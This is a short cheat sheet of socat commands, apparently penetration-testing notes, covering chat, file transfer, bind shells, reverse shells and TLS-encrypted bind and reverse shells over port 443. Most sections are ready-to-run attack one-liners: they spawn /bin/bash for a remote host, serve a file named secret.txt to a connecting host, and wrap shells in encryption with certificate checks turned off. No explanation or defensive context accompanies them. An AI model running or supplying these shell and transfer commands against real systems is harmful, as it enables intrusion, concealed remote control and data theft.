### Chat
```
socat - TCP4:192.168.1.4:80
socat TCP4-LISTEN:80 STDOUT
```

### Transfer Files
```
socat TCP4-LISTEN:4444,fork file:secret.txt
socat TCP4:192.168.1.4:4444 file:recieved.txt,create
```

### Bind Shell
```
socat TCP4-LISTEN:4444,fork EXEC:/bin/bash
socat - TCP4:192.168.1.4:4444
```

### Reverse Shell
```
socat -d -d TCP4-LISTEN:4444 STDOUT  # For Verbosity (-d -d)
socat TCP4:192.168.1.5:4444 EXEC:/bin/bash
```

### Generate Certificate
```
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
cat bind_shell.key bind_shell.crt > bind_shell.pem
```

### Encrypted Bind Shell
```
socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
socat - OPENSSL:192.168.1.4:443,verify=0
```

### Encrypted Reverse Shell
```
socat - OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork
socat OPENSSL:10.11.0.4:443,verify=0 EXEC:/bin/bash
```
